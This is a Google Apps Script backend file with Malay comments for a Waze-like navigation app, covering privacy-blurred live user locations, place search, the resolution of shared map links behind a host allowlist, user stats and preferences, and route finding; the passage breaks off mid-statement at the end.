// Lokasi pengguna disimpan dalam CacheService, BUKAN Sheet. Dahulu setiap kemas kini memegang kunci skrip & menulis ke
// Sheet, dan setiap getLiveData membaca seluruh sheet Pengguna — itu had utama bila pengguna bertambah.
//   u_<id>      = rekod terkini pengguna (sumber sebenar). Luput sendiri selepas USER_ACTIVE_SEC (privasi: tiada sejarah).
//   uc_<i>_<j>  = indeks sel grid ~22 km: { id: masa } — siapa yang MUNGKIN berada dalam sel itu.
//   u_all       = { id: masa } pengguna sejam lalu (untuk panel pentadbir sahaja; tiada lokasi).
// Indeks dikemas kini tanpa kunci (baca-ubah-tulis). Jika dua permintaan bertembung, satu entri indeks mungkin hilang
// sehingga kemas kini seterusnya (≤ 30 s) — tidak berbahaya kerana pembaca sentiasa menyemak semula rekod u_<id>.
// Mod halimunan memadam u_<id>, jadi pengguna itu hilang serta-merta walaupun masih tersenarai dalam indeks.
const USER_CELL_DEG_ = 0.2;   // sel ~22 km: radius 15 km (NEARBY_USERS_KM) dicakup oleh sel sendiri + 8 jiran
const USER_CELL_MAX_ = 1500;  // had entri satu sel (nilai cache maks 100 KB)
const USER_SEEN_SEC_ = 300;   // u_all dikemas kini paling kerap sekali setiap 5 minit bagi seorang pengguna
const USERS_SENT_MAX_ = 200;  // had pengguna dalam satu respons (terdekat dahulu)

function parseJson_(s) {
  if (s == null) return null;
  try { return JSON.parse(s); } catch (e) { return null; }
}

function userCellKey_(i, j) { return 'uc_' + i + '_' + j; }
function userCellIdx_(lat, lng) { return [Math.floor(lat / USER_CELL_DEG_), Math.floor(lng / USER_CELL_DEG_)]; }

/** Tambah/kemas kini id dalam indeks { id: saat } di cache; buang entri lebih lama daripada maxAgeSec; hadkan saiz. */
function touchIndex_(cache, key, id, nowSec, maxAgeSec, cap, ttlSec) {
  const idx = parseJson_(cache.get(key)) || {};
  idx[id] = nowSec;
  let ids = Object.keys(idx).filter(k => idx[k] > nowSec - maxAgeSec);
  if (ids.length > cap) ids = ids.sort((a, b) => idx[b] - idx[a]).slice(0, cap);
  const out = {};
  ids.forEach(k => { out[k] = idx[k]; });
  cache.put(key, JSON.stringify(out), ttlSec);
}

function updateLocation(token, u) {
  return updateLocation_(verify_(token), u);
}

function updateLocation_(userId, u) {
  u = u || {};
  const lat = Number(u.lat), lng = Number(u.lng);
  if (!isValidCoord_(lat, lng)) return { ok: false };
  rateLimit_('location', userId);

  const cache = CacheService.getScriptCache(), now = Date.now(), nowSec = Math.floor(now / 1000);
  const prev = parseJson_(cache.get('u_' + userId));
  // Simpan koordinat dibundarkan (~10 m) — cukup untuk peta, kurang tepat untuk penjejakan. Arah hanya disimpan kasar
  // (8 mata angin) untuk mengesan kesesakan automatik pada arah yang betul (lebuh raya dua hala).
  const hd = Number(u.heading);
  const rec = {
    n: String(u.name == null ? '' : u.name).replace(/[\u0000-\u001f<>]/g, '').trim().slice(0, 30) || 'Tanpa Nama',
    lat: round_(lat, 4), lng: round_(lng, 4), v: clamp_(Number(u.speed) || 0, 0, 300),
    m: MOODS.indexOf(String(u.mood)) >= 0 ? String(u.mood) : '', t: now,
    h: u.heading != null && isFinite(hd) && hd >= 0 && hd <= 360 ? Math.round(hd / 45) % 8 : -1,
    s: prev && nowSec - Number(prev.s || 0) < USER_SEEN_SEC_ ? Number(prev.s) : 0
  };
  if (!rec.s) {
    touchIndex_(cache, 'u_all', userId, nowSec, 3600, CONFIG.MAX_USERS, 3600);
    rec.s = nowSec;
  }
  // Rekod dahulu, kemudian indeks: pembaca yang menjumpai id dalam indeks sentiasa mendapat rekod terkini.
  cache.put('u_' + userId, JSON.stringify(rec), CONFIG.USER_ACTIVE_SEC);
  const c = userCellIdx_(rec.lat, rec.lng);
  touchIndex_(cache, userCellKey_(c[0], c[1]), userId, nowSec, CONFIG.USER_ACTIVE_SEC, USER_CELL_MAX_, 600);
  return { ok: true };
}

/** Padam lokasi pengguna dengan serta-merta (mod halimunan). */
function hideMe(token) {
  const userId = verify_(token);
  rateLimit_('location', userId);
  CacheService.getScriptCache().remove('u_' + userId);
  return { ok: true };
}

function getActiveUsers_(myId, near) {
  if (!near) return [];
  const cache = CacheService.getScriptCache(), now = Date.now();
  const cutoffSec = now / 1000 - CONFIG.USER_ACTIVE_SEC, c = userCellIdx_(near.lat, near.lng), keys = [];
  for (let a = -1; a <= 1; a++) for (let b = -1; b <= 1; b++) keys.push(userCellKey_(c[0] + a, c[1] + b));
  const cells = cache.getAll(keys), ids = {};
  Object.keys(cells).forEach(k => {
    const idx = parseJson_(cells[k]) || {};
    Object.keys(idx).forEach(id => { if (id !== myId && idx[id] > cutoffSec) ids[id] = true; });
  });
  const list = Object.keys(ids), found = [];
  for (let i = 0; i < list.length; i += 100) {             // getAll dalam kumpulan kecil
    const recs = cache.getAll(list.slice(i, i + 100).map(id => 'u_' + id));
    Object.keys(recs).forEach(k => {
      const r = parseJson_(recs[k]);
      if (!r || !(Number(r.t) > now - CONFIG.USER_ACTIVE_SEC * 1000)) return;
      const d = distKm_(near.lat, near.lng, Number(r.lat), Number(r.lng));
      if (d <= CONFIG.NEARBY_USERS_KM) found.push({ r: r, d: d });
    });
  }
  return found.sort((a, b) => a.d - b.d).slice(0, USERS_SENT_MAX_)
    // Data awam dikaburkan: koordinat ~100 m, kelajuan dibundarkan, arah kasar (8 mata angin), tiada ID.
    .map(x => {
      const h = Number(x.r.h), o = { name: String(x.r.n || ''), lat: round_(Number(x.r.lat), 3), lng: round_(Number(x.r.lng), 3),
        speed: Math.round(Number(x.r.v) / 10) * 10, mood: MOODS.indexOf(String(x.r.m)) >= 0 ? String(x.r.m) : '' };
      if (h >= 0 && h <= 7) o.dir = h * 45;
      return o;
    });
}

/**
 * Satu panggilan untuk segarkan semua data peta (jimat kuota). loc (pilihan) = lokasi pengguna untuk dikongsi —
 * dahulu panggilan updateLocation berasingan; digabung supaya bilangan pelaksanaan Apps Script (had ~30 serentak)
 * berkurang. v = versi aplikasi di server (klien menawarkan muat semula bila versinya lama).
 */
function getLiveData(token, lat, lng, loc) {
  const userId = verify_(token);
  rateLimit_('live', userId);
  if (loc && typeof loc === 'object') {
    try { updateLocation_(userId, loc); } catch (e) { /* had lokasi: data peta tetap dipulangkan */ }
  }
  lat = Number(lat); lng = Number(lng);
  const near = isValidCoord_(lat, lng) ? { lat: lat, lng: lng } : null;
  return { reports: nearbyReports_(near), users: getActiveUsers_(userId, near), v: APP_VERSION };
}

function nearbyReports_(near) {
  if (!near) return [];
  return getReports_()
    .map(r => ({ r: r, d: distKm_(near.lat, near.lng, r.lat, r.lng) }))
    .filter(x => x.d <= CONFIG.REPORTS_RADIUS_KM)
    .sort((a, b) => a.d - b.d)
    .slice(0, CONFIG.MAX_REPORTS_SENT)
    .map(x => x.r);
}

// ---------------------------------------------------------------- Laluan & carian

// ---------------------------------------------------------------- Carian tempat (seperti Waze)
// Geocoder Apps Script hanya bagus untuk ALAMAT. Untuk nama kedai/restoran, guna:
//   1. Google Places (jika PLACES_API_KEY ditetapkan dalam Script Properties) — paling hampir dengan Waze
//   2. OpenStreetMap Photon (percuma, tanpa kunci)
//   3. Geocoder Google (alamat), diutamakan berhampiran pengguna
// URL perkhidmatan adalah TETAP (bukan dari pengguna) — tiada risiko SSRF. Kunci API tidak pernah dihantar ke klien.

function searchPlaces(token, query, lat, lng) {
  const userId = verify_(token);
  query = String(query == null ? '' : query).replace(/[\u0000-\u001f<>]/g, ' ').replace(/\s+/g, ' ').trim().slice(0, 120);
  if (!query) return [];
  rateLimit_('geocode', userId);
  lat = Number(lat); lng = Number(lng);
  const near = isValidCoord_(lat, lng) ? { lat: lat, lng: lng } : null;
  const cache = CacheService.getScriptCache();
  const ck = 'sp_' + hash_(query.toLowerCase() + '|' + (near ? round_(lat, 1) + ',' + round_(lng, 1) : '')).slice(0, 40);
  const hit = cache.get(ck);
  if (hit) return JSON.parse(hit);

  let out = [];
  const st = { limited: false };
  const safeList_ = fn => { try { return fn() || []; } catch (e) { if (/Terlalu banyak/.test(e.message)) st.limited = true; return []; } };
  const key = PropertiesService.getScriptProperties().getProperty('PLACES_API_KEY');
  if (key) out = out.concat(safeList_(() => placesSearch_(key, query, near)));
  // Alamat bernombor / berposkod → Google dahulu: OSM (Photon) jarang ada nombor rumah di Malaysia,
  // jadi ia memulangkan tengah jalan, bukan rumah (cth. "no. 31 jalan IK 3/3" tersasar ratusan meter).
  const addr = ADDRESS_RE_.test(query);
  if (addr) out = out.concat(safeList_(() => geocodeNear_(addressQuery_(query), near)));
  if (out.length < 3) out = out.concat(safeList_(() => photonSearch_(query, near)));
  if (out.length < 3 && /&/.test(query)) out = out.concat(safeList_(() => photonSearch_(query.replace(/\s*&\s*/g, '&'), near)));
  if (!addr && out.length < 3) out = out.concat(safeList_(() => geocodeNear_(query, near)));
  out = dedupePlaces_(out).slice(0, 8);
  if (!out.length && st.limited) throw new Error('Terlalu banyak permintaan. Cuba lagi nanti.');
  if (!st.limited) try { cache.put(ck, JSON.stringify(out), 3600); } catch (e) { /* abaikan */ }
  return out;
}

function placeOut_(title, sub, lat, lng, src) {
  const txt = (v, n) => String(v == null ? '' : v).replace(/<[^>]*>/g, '').replace(/[\u0000-\u001f<>]/g, '').trim().slice(0, n);
  lat = Number(lat); lng = Number(lng);
  if (!isValidCoord_(lat, lng) || !txt(title, 80)) return null;
  return { title: txt(title, 80), sub: txt(sub, 160), lat: lat, lng: lng, src: src };
}

function dedupePlaces_(list) {
  const out = [];
  list.filter(Boolean).forEach(p => {
    const dup = out.some(q => q.title.toLowerCase() === p.title.toLowerCase() && distKm_(p.lat, p.lng, q.lat, q.lng) < 0.15);
    if (!dup) out.push(p);
  });
  return out;
}

function placesSearch_(key, query, near) {
  rateLimit_('G_places');
  const body = { textQuery: query, languageCode: 'ms', regionCode: 'MY', maxResultCount: 8 };
  if (near) body.locationBias = { circle: { center: { latitude: round_(near.lat, 2), longitude: round_(near.lng, 2) }, radius: 50000 } };
  const res = UrlFetchApp.fetch('https://places.googleapis.com/v1/places:searchText', {
    method: 'post', contentType: 'application/json', payload: JSON.stringify(body), muteHttpExceptions: true,
    headers: { 'X-Goog-Api-Key': key, 'X-Goog-FieldMask': 'places.displayName,places.formattedAddress,places.location' }
  });
  if (res.getResponseCode() !== 200) return [];       // jangan dedahkan ralat/kunci kepada klien
  const data = JSON.parse(res.getContentText());
  return (data.places || []).map(p => placeOut_(p.displayName && p.displayName.text, p.formattedAddress,
    p.location && p.location.latitude, p.location && p.location.longitude, 'google'));
}

function photonSearch_(query, near) {
  rateLimit_('G_photon');
  let url = 'https://photon.komoot.io/api/?limit=8&bbox=99.6,0.8,119.3,7.4&q=' + encodeURIComponent(query);
  if (near) url += '&lat=' + near.lat.toFixed(2) + '&lon=' + near.lng.toFixed(2) + '&location_bias_scale=0.3';
  const res = UrlFetchApp.fetch(url, { muteHttpExceptions: true, followRedirects: false });
  if (res.getResponseCode() !== 200) return [];
  const data = JSON.parse(res.getContentText());
  return (data.features || []).map(f => {
    const p = f.properties || {}, c = (f.geometry && f.geometry.coordinates) || [];
    const street = [p.housenumber, p.street].filter(Boolean).join(' ');
    const title = p.name || street;
    const sub = [p.name ? street : '', p.district || p.locality, p.city, p.postcode, p.state].filter(Boolean).join(', ');
    return placeOut_(title, sub, c[1], c[0], 'osm');
  });
}

const ADDRESS_RE_ = /^\s*(?:no\.?|lot|unit)?\s*\d+[a-z]?\b|\b\d{5}\b/i;   // "31 Jalan…", "No. 31…", poskod 43900
/** "no. 31 jalan IK 3/3 Taman…" → "31, jalan IK 3/3 Taman…" (bentuk yang difahami Google Geocoder) */
function addressQuery_(q) {
  return q.replace(/^\s*(?:no\.?|lot|unit)\s*(?=\d)/i, '').replace(/^(\d+[a-z]?)\s+(?=[a-z])/i, '$1, ');
}

function geocodeNear_(query, near) {
  rateLimit_('G_maps');
  const g = Maps.newGeocoder().setRegion(CONFIG.REGION).setLanguage('ms');
  if (near) g.setBounds(near.lat - 0.5, near.lng - 0.5, near.lat + 0.5, near.lng + 0.5);
  const res = g.geocode(query);
  return (res.results || []).slice(0, 5).map(r => {
    const parts = String(r.formatted_address || '').split(',').map(x => x.trim());
    let n = 1;
    while (n < parts.length - 1 && /^\d[\w\-\/]{0,5}$/.test(parts[n - 1])) n++;
    // ROOFTOP / RANGE_INTERPOLATED = tepat di rumah; selain itu Google hanya tahu jalan/kawasan
    const exact = /^(ROOFTOP|RANGE_INTERPOLATED)$/.test(String(r.geometry.location_type || 'ROOFTOP'));
    return placeOut_(parts.slice(0, n).join(', '), (exact ? '' : 'Anggaran · ') + parts.slice(n).join(', '),
      r.geometry.location.lat, r.geometry.location.lng, 'alamat');
  });
}

// Peribadi (berakhir dengan "_"): tidak boleh dipanggil terus dari pelayar — hanya melalui resolveLocation.
function geocode_(userId, query) {
  query = String(query == null ? '' : query).trim().slice(0, 200);
  if (!query) return [];
  rateLimitAll_([['geocode', userId], ['G_maps']]);
  const res = Maps.newGeocoder().setRegion(CONFIG.REGION).setLanguage('ms').geocode(query);
  return (res.results || []).slice(0, 5).map(g => ({
    name: g.formatted_address,
    lat: g.geometry.location.lat,
    lng: g.geometry.location.lng
  }));
}

// ---------------------------------------------------------------- Pautan lokasi (WhatsApp, Google Maps, Waze)

// Hanya domain peta ini yang boleh diikuti (halang SSRF / server dijadikan proksi ke laman lain).
const LINK_HOSTS_ = ['maps.app.goo.gl', 'goo.gl', 'g.co', 'maps.google.com', 'google.com', 'www.google.com',
  'google.com.my', 'www.google.com.my', 'maps.apple.com', 'waze.com', 'www.waze.com', 'ul.waze.com'];

function coordsFromText_(t) {
  t = String(t || '');
  try { t = decodeURIComponent(t); } catch (e) { /* biar */ }
  const pats = [
    /!3d(-?\d{1,2}\.\d+)!4d(-?\d{1,3}\.\d+)/,                                          // Google place
    /[?&](?:q|ll|query|destination|daddr|center|sll|to)=(?:loc:)?(-?\d{1,2}\.\d+)\s*,\s*(-?\d{1,3}\.\d+)/i,
    /@(-?\d{1,2}\.\d+),(-?\d{1,3}\.\d+)/,                                               // Google @lat,lng
    /geo:(-?\d{1,2}\.\d+),(-?\d{1,3}\.\d+)/i,
    /(?:^|[^\d.])(-?\d{1,2}\.\d{3,})\s*,\s*(-?\d{1,3}\.\d{3,})(?![\d.])/                 // "3.1390, 101.6869"
  ];
  for (let i = 0; i < pats.length; i++) {
    const m = t.match(pats[i]);
    if (m && isValidCoord_(Number(m[1]), Number(m[2]))) return { lat: Number(m[1]), lng: Number(m[2]) };
  }
  return null;
}

function placeNameFromUrl_(u) {
  const m = String(u).match(/\/maps\/place\/([^\/@?]+)/);
  if (!m) return '';
  try { return decodeURIComponent(m[1].replace(/\+/g, ' ')).slice(0, 80); } catch (e) { return ''; }
}

function allowedLink_(u) {
  const m = String(u).match(/^https:\/\/([^\/?#:@]+)(?:[\/?#]|$)/i);
  return !!m && LINK_HOSTS_.indexOf(m[1].toLowerCase()) >= 0;
}

/**
 * Tukar teks/pautan lokasi kepada {title, sub, lat, lng}.
 * Pautan pendek (maps.app.goo.gl) diikut secara manual, maksimum 5 lompatan, setiap satu disemak.
 */
function resolveLocation(token, text) {
  const userId = verify_(token);
  text = String(text == null ? '' : text).slice(0, 2000);
  const direct = coordsFromText_(text);
  if (direct) return { title: 'Lokasi dikongsi', sub: direct.lat.toFixed(5) + ', ' + direct.lng.toFixed(5), lat: direct.lat, lng: direct.lng };

  const urlMatch = text.match(/https:\/\/[^\s<>"']+/i);
  if (!urlMatch) throw new Error('Tiada pautan lokasi dijumpai.');
  let url = urlMatch[0];
  if (!allowedLink_(url)) throw new Error('Pautan ini bukan pautan peta yang disokong.');
  rateLimitAll_([['resolve', userId], ['G_resolve']]);

  let name = placeNameFromUrl_(url);
  for (let hop = 0; hop < 5; hop++) {
    const c = coordsFromText_(url);
    if (c) return { title: name || 'Lokasi dikongsi', sub: c.lat.toFixed(5) + ', ' + c.lng.toFixed(5), lat: c.lat, lng: c.lng };
    let res;
    try {
      res = UrlFetchApp.fetch(url, { followRedirects: false, muteHttpExceptions: true, validateHttpsCertificates: true });
    } catch (err) {
      throw new Error('Tidak dapat membuka pautan ini. Cuba lagi.'); // jangan dedahkan ralat dalaman
    }
    const code = res.getResponseCode();
    const loc = res.getHeaders()['Location'] || res.getHeaders()['location'];
    if (code >= 300 && code < 400 && loc) {
      if (!allowedLink_(loc)) throw new Error('Pautan menghala ke laman yang tidak disokong.');
      url = loc;
      name = placeNameFromUrl_(url) || name;
      continue;
    }
    break;
  }
  // Pautan tanpa koordinat (cth. ?q=Nama+Tempat) → cari nama tempat
  const q = (url.match(/[?&](?:q|query|daddr|destination)=([^&]+)/i) || [])[1];
  if (q) {
    let place = q;
    try { place = decodeURIComponent(q.replace(/\+/g, ' ')); } catch (e) { /* biar */ }
    const hits = geocode_(userId, place);
    if (hits.length) {
      const parts = hits[0].name.split(',');
      return { title: parts[0].trim(), sub: parts.slice(1).join(',').trim(), lat: hits[0].lat, lng: hits[0].lng };
    }
  }
  throw new Error('Tidak dapat membaca lokasi daripada pautan ini.');
}

// ---------------------------------------------------------------- Profil & statistik (mata, lencana)

function statsSheet_() {
  const id = PropertiesService.getScriptProperties().getProperty('SHEET_ID');
  if (!id) throw new Error('Sistem belum disediakan.');
  const ss = SpreadsheetApp.openById(id);
  return ss.getSheetByName(SHEET_STATS) || ensureSheet_(ss, SHEET_STATS, STATS_HEADERS);
}

/** Tambah kiraan. MESTI dipanggil semasa kunci skrip sudah dipegang (dalam submitReport / voteReport / getProfile). */
function bumpStats_(userId, name, dReports, dUpRecv, dVotes) {
  const sh = statsSheet_();
  const last = sh.getLastRow();
  let rowNum = -1;
  if (last >= 2) {
    const ids = sh.getRange(2, 1, last - 1, 1).getValues();
    const idx = ids.findIndex(v => v[0] === userId);
    if (idx >= 0) rowNum = idx + 2;
  }
  if (rowNum < 0) {
    if (last - 1 >= CONFIG.MAX_STATS_ROWS) return; // had baris — halang Sheet dibanjiri identiti palsu
    sh.appendRow([userId, protectCell_(String(name || '')), dReports, dUpRecv, dVotes, new Date(), new Date()]);
    return;
  }
  const r = sh.getRange(rowNum, 1, 1, STATS_HEADERS.length).getValues()[0];
  // r[1] dibaca semula dari Sheet — getValues() membuang awalan ' , jadi lindungi semula sebelum ditulis balik
  sh.getRange(rowNum, 2, 1, 4).setValues([[protectCell_(String(name || r[1] || '')),
    Number(r[2]) + dReports, Number(r[3]) + dUpRecv, Number(r[4]) + dVotes]]);
  sh.getRange(rowNum, 7).setValue(new Date());   // Aktif: untuk pembersihan rekod lama dalam cleanup()
}

function getProfile(token) {
  const userId = verify_(token);
  rateLimit_('profile', userId);
  const lock = lock_();
  try {
    const sh = statsSheet_();
    const last = sh.getLastRow();
    let r = null;
    if (last >= 2) {
      const rows = sh.getRange(2, 1, last - 1, STATS_HEADERS.length).getValues();
      r = rows.find(x => x[0] === userId) || null;
    }
    if (!r) { bumpStats_(userId, '', 0, 0, 0); r = [userId, '', 0, 0, 0, new Date()]; }
    const reports = Number(r[2]) || 0, upRecv = Number(r[3]) || 0, votes = Number(r[4]) || 0;
    return { reports: reports, upReceived: upRecv, votes: votes, points: reports * 10 + upRecv * 5 + votes,
      joined: new Date(r[5]).getTime() || Date.now(), signedIn: !!Session.getTemporaryActiveUserKey(), moods: MOODS };
  } finally {
    lock.releaseLock();
  }
}

/** Nama jalan di kedudukan semasa (untuk label di bawah peta). Klien memanggilnya jarang-jarang. */
function whereAmI(token, lat, lng) {
  const userId = verify_(token);
  lat = Number(lat); lng = Number(lng);
  if (!isValidCoord_(lat, lng)) return { road: '' };
  rateLimitAll_([['geocode', userId], ['G_maps']]);
  const res = Maps.newGeocoder().setLanguage('ms').reverseGeocode(lat, lng);
  const results = res.results || [];
  // Cari nama jalan dalam mana-mana hasil; abaikan "Plus Code" Google (cth. "XP94+V3 Serdang")
  for (let i = 0; i < results.length; i++) {
    const route = (results[i].address_components || []).filter(c => (c.types || []).indexOf('route') >= 0)[0];
    if (route && !PLUS_CODE_.test(route.long_name)) return { road: route.long_name };
  }
  for (let i = 0; i < results.length; i++) {
    const first = String(results[i].formatted_address || '').split(',')[0].trim();
    if (first && !PLUS_CODE_.test(first)) return { road: first };
  }
  return { road: '' };
}
const PLUS_CODE_ = /^[23456789CFGHJMPQRVWX]{2,8}\+[23456789CFGHJMPQRVWX]{0,3}\b/i;

// ---------------------------------------------------------------- Data pengguna (disegerak ke server)
// iPhone membuang storan pelayar dalam iframe Apps Script, jadi nama, tetapan, Rumah/Kerja & kegemaran
// disimpan di server mengikut ID pengguna (terikat pada akaun Google dalam mod "Anyone with Google account").
// Data hanya dipulangkan kepada pemiliknya, dan disahkan dengan senarai medan yang dibenarkan.

function prefsSheet_() {
  const id = PropertiesService.getScriptProperties().getProperty('SHEET_ID');
  if (!id) throw new Error('Sistem belum disediakan.');
  const ss = SpreadsheetApp.openById(id);
  return ss.getSheetByName(SHEET_PREFS) || ensureSheet_(ss, SHEET_PREFS, PREFS_HEADERS);
}

function cleanPlace_(pl) {
  if (!pl || typeof pl !== 'object') return null;
  const lat = Number(pl.lat), lng = Number(pl.lng);
  if (!isValidCoord_(lat, lng)) return null;
  const txt = (v, n) => String(v == null ? '' : v).replace(/[\u0000-\u001f<>]/g, '').trim().slice(0, n);
  return { title: txt(pl.title, 80) || 'Tempat', sub: txt(pl.sub, 160), lat: lat, lng: lng };
}

/** Hanya nilai mudah dibenarkan dalam tetapan: nombor, boolean, teks pendek, atau senarai teks pendek. */
function cleanSettings_(o) {
  const out = {};
  if (!o || typeof o !== 'object' || Array.isArray(o)) return out;
  Object.keys(o).slice(0, 40).forEach(k => {
    if (!/^[A-Za-z]{1,24}$/.test(k)) return;
    const v = o[k];
    if (typeof v === 'number' && isFinite(v)) out[k] = v;
    else if (typeof v === 'boolean') out[k] = v;
    else if (typeof v === 'string') out[k] = v.slice(0, 60);
    else if (Array.isArray(v)) out[k] = v.filter(x => typeof x === 'string').slice(0, 20).map(x => x.slice(0, 30));
  });
  return out;
}

function cleanPrefs_(p) {
  p = p && typeof p === 'object' ? p : {};
  const pl = p.places && typeof p.places === 'object' ? p.places : null;
  return {
    t: Number(p.t) || Date.now(),
    name: String(p.name == null ? '' : p.name).replace(/[\u0000-\u001f<>]/g, '').trim().slice(0, 30),
    settings: cleanSettings_(p.settings),
    places: pl ? { home: cleanPlace_(pl.home), work: cleanPlace_(pl.work),
      favs: (Array.isArray(pl.favs) ? pl.favs : []).slice(0, 10).map(cleanPlace_).filter(Boolean) } : null,
    voice: p.voice === 'en' ? 'en' : 'ms',
    sound: p.sound !== false, hidden: p.hidden === true, tol: p.tol === true, headup: p.headup !== false
  };
}

function loadPrefs(token) {
  const userId = verify_(token);
  rateLimit_('prefsLoad', userId);
  const sh = prefsSheet_();
  const last = sh.getLastRow();
  if (last < 2) return null;
  const rows = sh.getRange(2, 1, last - 1, 2).getValues();
  const r = rows.find(x => x[0] === userId);
  if (!r) return null;
  try { return cleanPrefs_(JSON.parse(String(r[1]))); } catch (e) { return null; }
}

function savePrefs(token, json) {
  const userId = verify_(token);
  rateLimit_('prefsSave', userId);
  json = String(json == null ? '' : json);
  if (json.length > CONFIG.MAX_PREFS_CHARS) throw new Error('Data terlalu besar.');
  let data;
  try { data = cleanPrefs_(JSON.parse(json)); } catch (e) { throw new Error('Data tidak sah.'); }
  const out = protectCell_(JSON.stringify(data));
  const lock = lock_();
  try {
    const sh = prefsSheet_();
    const last = sh.getLastRow();
    let rowNum = -1;
    if (last >= 2) {
      const idx = sh.getRange(2, 1, last - 1, 1).getValues().findIndex(v => v[0] === userId);
      if (idx >= 0) rowNum = idx + 2;
    }
    if (rowNum > 0) sh.getRange(rowNum, 2, 1, 2).setValues([[out, new Date()]]);
    else if (last - 1 < CONFIG.MAX_PREFS_ROWS) sh.appendRow([userId, out, new Date()]);
    return { ok: true };
  } finally {
    lock.releaseLock();
  }
}

/** Padam data pengguna dari server (butang dalam Akaun & log masuk). */
function deletePrefs(token) {
  const userId = verify_(token);
  rateLimit_('prefsSave', userId);
  const lock = lock_();
  try {
    const sh = prefsSheet_();
    const last = sh.getLastRow();
    if (last < 2) return { ok: true };
    const idx = sh.getRange(2, 1, last - 1, 1).getValues().findIndex(v => v[0] === userId);
    if (idx >= 0) sh.deleteRow(idx + 2);
    return { ok: true };
  } finally {
    lock.releaseLock();
  }
}

// Jarak garis lurus maksimum asal → destinasi. Perjalanan darat terpanjang yang munasabah di rantau ini
// (cth. Bangkok → Singapura ~1,430 km) masih di bawah had; lokasi pelayar yang salah (UK, Eropah) jauh melebihinya.
const ROUTE_MAX_KM_ = 2000;
const MAPS_QUOTA_MSG_ = 'Kuota peta Google hari ini sudah habis. Cuba lagi esok.';
/** Apps Script melontar "Service invoked too many times for one day: route." bila kuota harian Maps habis. */
function isMapsQuotaErr_(e) { return /too many times|quota|OVER_(QUERY|DAILY)_LIMIT/i.test(String(e && e.message || e)); }

/**
 * origin: {lat,lng}; dest: {lat,lng}; opts: {avoidTolls}
 * Menggunakan servis Maps terbina dalam Apps Script (tiada API key diperlukan).
 */
function getRoute(token, origin, dest, opts) {
  const userId = verify_(token);
  origin = origin || {}; dest = dest || {}; opts = opts || {};
  const oLat = Number(origin.lat), oLng = Number(origin.lng);
  const dLat = Number(dest.lat), dLng = Number(dest.lng);
  if (!isValidCoord_(oLat, oLng) || !isValidCoord_(dLat, dLng)) {
    throw new Error('Titik asal/destinasi tidak sah.');
  }
  // Tiada laluan darat sejauh ini dari Malaysia — biasanya lokasi pelayar salah (komputer tanpa GPS, VPN).
  // Disemak SEBELUM had kadar & panggilan Google supaya tidak membazir kuota Maps.
  const km = distKm_(oLat, oLng, dLat, dLng);
  if (km > ROUTE_MAX_KM_) {
    throw new Error('Lokasi anda dikesan ' + Math.round(km) + ' km dari destinasi. Semak GPS atau matikan VPN.');
  }
  // Semakan berkala (bukan permintaan pengguna) dihadkan berasingan supaya tidak menghabiskan kuota Maps bersama
  rateLimitAll_([['route', userId], ['G_maps']].concat(opts.recheck === true ? [['G_recheck']] : []));
  const lang = opts.lang === 'en' ? 'en' : 'ms'; // senarai dibenarkan — arahan belokan ikut bahasa suara
  // Mod: jalan kaki = WALKING; kereta & motosikal = DRIVING (servis Maps Apps Script tiada mod motosikal)
  const walk = opts.mode === 'walk';

  const df = Maps.newDirectionFinder()
    .setOrigin(oLat, oLng)
    .setDestination(dLat, dLng)
    .setMode(walk ? Maps.DirectionFinder.Mode.WALKING : Maps.DirectionFinder.Mode.DRIVING)
    .setAlternatives(true)
    .setRegion(CONFIG.REGION)
    .setLanguage(lang)
    .setDepart(new Date());
  // Titik singgah (cth. stesen minyak dari "Cari di sepanjang laluan")
  const via = opts.via && isValidCoord_(Number(opts.via.lat), Number(opts.via.lng)) ? opts.via : null;
  if (via) df.addWaypoint(Number(via.lat), Number(via.lng));
  // Elak: tol / lebuh raya / feri (digabung dengan "|" seperti Directions API)
  const avoid = [];
  // Pilihan elak tol / lebuh raya / feri tidak berkaitan untuk pejalan kaki
  if (!walk && opts.avoidTolls === true) avoid.push(Maps.DirectionFinder.Avoid.TOLLS);
  if (!walk && opts.avoidHighways === true) avoid.push(Maps.DirectionFinder.Avoid.HIGHWAYS);
  const wantFerries = !walk && opts.avoidFerries === true;
  let res;
  try {
    try {
      if (avoid.length || wantFerries) df.setAvoid(avoid.concat(wantFerries ? ['ferries'] : []).join('|'));
      res = df.getDirections();
    } catch (e) {
      if (!wantFerries || isMapsQuotaErr_(e)) throw e;
      // Jika "ferries" tidak diterima oleh servis Maps Apps Script, cuba tanpa pilihan itu
      df.setAvoid(avoid.join('|'));
      res = df.getDirections();
    }
  } catch (e) {
    if (isMapsQuotaErr_(e)) { console.warn('getRoute: kuota Maps habis — ' + e.message); throw new Error(MAPS_QUOTA_MSG_); }
    throw e;
  }
  if (res.status !== 'OK') {
    console.warn('getRoute: status Google ' + res.status + ' (' + Math.round(km) + ' km, ' + (walk ? 'jalan kaki' : 'memandu') +
      (avoid.length || wantFerries ? ', elak ' + avoid.concat(wantFerries ? ['ferries'] : []).join('|') : '') + ')');
    if (/^OVER_(QUERY|DAILY)_LIMIT$/.test(res.status)) throw new Error(MAPS_QUOTA_MSG_);
    throw new Error(res.status === 'ZERO_RESULTS' ? 'Tiada laluan ke destinasi ini.' : 'Laluan tidak dijumpai.');
  }

  if (!opts.recheck) bumpDaily_('n');   // satu carian laluan (bukan semakan "laluan lebih pantas")
  return res.routes.map(rt => {
    // Dengan titik singgah, laluan ada 2 "leg" → dicantum menjadi satu
    const legs = rt.legs, sum = f => legs.reduce((a, l) => a + f(l), 0);
    const distM = sum(l => l.distance.value), normal = sum(l => l.duration.value);
    const hasTraffic = legs.every(l => l.duration_in_traffic);
    const durSec = hasTraffic ? sum(l => l.duration_in_traffic.value) : normal;
    return {
      summary: rt.summary,
      polyline: rt.overview_polyline.points,
      distanceM: distM,
      distanceText: legs.length === 1 ? legs[0].distance.text : (distM / 1000).toFixed(1) + ' km',
      durationSec: durSec,
      durationText: legs.length === 1 ? (legs[0].duration_in_traffic || legs[0].duration).text : Math.round(durSec / 60) + ' min',
      // Lewat akibat trafik (masa semasa − masa biasa). null jika Google tidak memulangkan data trafik.
      delaySec: hasTraffic ? Math.max(0, durSec - normal) : null,
      steps: [].concat.apply([], legs.map(l => l.steps)).map(s => {
        const html = String(s.html_instructions || '');
        return {
          text: stripHtml_(html),
          road: roadName_(html),
          exit: exitNumber_(html),
          distText: s.distance.text,
          distM: s.distance.value,
          lat: s.start_location.lat,
          lng: s.start_location.lng,
          maneuver: s.maneuver || ''
        };
      })
    };
  });
}

const DIRECTION_WORDS_ = new RegExp('^(' + [
